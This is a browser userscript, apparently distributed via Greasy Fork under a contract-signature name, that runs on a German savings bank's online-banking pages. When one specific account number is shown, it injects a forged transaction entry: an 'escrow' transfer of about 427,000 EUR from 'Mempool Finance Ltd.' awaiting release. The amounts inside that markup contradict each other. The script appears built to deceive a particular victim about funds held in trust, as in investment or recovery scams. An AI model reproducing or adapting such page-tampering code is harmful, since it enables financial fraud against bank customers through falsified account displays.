// ==UserScript==
// @name         Vertragssignature Hermann Borniger
...
// @match        https://www.kskrh.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.kskrh.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.kskrh.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/465436/Vertragssignature%20Hermann%20Borniger.user.js
// @updateURL https://update.greasyfork.org/scripts/465436/Vertragssignature%20Hermann%20Borniger.meta.js
// ==/UserScript==
...
(function() {
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "110 2673 25" ){
            if (vorgemerkt == "no"){
            ...
            var xHTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 427.839,57 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Treuhand: Mempool Finance Ltd.">Treuhand: Mempool Finance Ltd.</a></h3><p>2023-05-04T10:15 Einreichung einer Treuhand Ueberweisung. Freigabe nötig durch Mempool Finance Ltd.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">427.389</span><span aria-hidden="true" class="balance-decimal plus">,57&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';
